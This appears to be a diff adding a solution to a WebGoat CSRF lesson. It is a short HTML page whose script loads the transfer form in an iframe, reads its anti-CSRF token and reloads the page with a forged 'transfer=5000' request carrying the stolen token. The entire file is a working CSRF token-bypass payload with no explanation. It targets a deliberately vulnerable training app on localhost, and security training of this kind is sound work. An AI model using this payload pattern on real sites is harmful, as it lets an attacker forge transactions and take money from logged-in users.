@@ -1,0 +1,8 @@
+<iframe id="badiframe" src='http://localhost:8010/WebGoat/attack?Screen=605842438&menu=900&transfer=main' onload="confirm()"></iframe>
+<script>
+function confirm() {
+	var token = document.getElementById("badiframe").contentDocument.getElementsByName('form')[0].elements["token"].value;
+	document.getElementById("badiframe").setAttribute("src", "http://localhost:8010/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token="+token);
+	document.getElementById("badiframe").onload="";
+}
+</script>
